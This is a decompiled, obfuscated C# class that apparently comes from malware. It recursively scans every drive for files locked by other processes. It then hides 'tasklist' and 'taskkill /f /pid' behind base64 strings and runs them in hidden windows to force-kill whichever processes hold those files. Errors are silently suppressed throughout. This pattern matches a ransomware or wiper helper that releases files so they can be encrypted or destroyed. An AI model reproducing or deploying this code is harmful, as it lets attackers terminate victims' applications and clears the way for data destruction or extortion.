using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace PbjBzLsVOvNrzQ;

internal class EQEqEmYOniIYC
{
	[CompilerGenerated]
	private sealed class UXhmvXLhoMJt
	{
		public string jOTDSXWJaoRnL;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(jOTDSXWJaoRnL);
		}
	}

	public static readonly List<string> JQlwqnqYjAmdzyXPb = new List<string>();

	public static readonly List<string> jVHyfNmvCpeoL = new List<string>();

	public static void OfWrckCoFFjD()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					dowEUzdLRDLKDN(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void dowEUzdLRDLKDN(string dWZhZaRtZJKruq)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(dWZhZaRtZJKruq);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					JQlwqnqYjAmdzyXPb.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					dowEUzdLRDLKDN(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (JQlwqnqYjAmdzyXPb.Count <= 0)
		{
			return;
		}
		foreach (string item in JQlwqnqYjAmdzyXPb.Where((string oargYRmPSCmI) => XFfMjPILkVPk(oargYRmPSCmI)))
		{
			jVHyfNmvCpeoL.Add(item);
		}
		JQlwqnqYjAmdzyXPb.Clear();
		if (jVHyfNmvCpeoL.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in jVHyfNmvCpeoL.Select((string iFyouZWlrqQtZm) => new FileInfo(iFyouZWlrqQtZm)))
		{
			sHrqLuXhMISyN(item2.Name);
		}
	}

	public static bool XFfMjPILkVPk(string ygLfaacCBuj)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(ygLfaacCBuj, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(ygLfaacCBuj, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void sHrqLuXhMISyN(string DaVcrahBJo)
	{
		try
		{
			string text = IiPllsNAYdIcs(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("dGFza2xpc3Q="), oIxRFVSIpmRuMqIJ.PBGxcXGgCq("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(DaVcrahBJo)
				select t into CXdjDitquzzEl
				select CXdjDitquzzEl.Split(new char[1] { ',' }) into RXclUfQDpfi
				select RXclUfQDpfi[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				IiPllsNAYdIcs(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("dGFza2tpbGw="), oIxRFVSIpmRuMqIJ.PBGxcXGgCq("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string IiPllsNAYdIcs(string FgJhdhimaoVA, string CSOmWgaqoTV)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(FgJhdhimaoVA, CSOmWgaqoTV);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
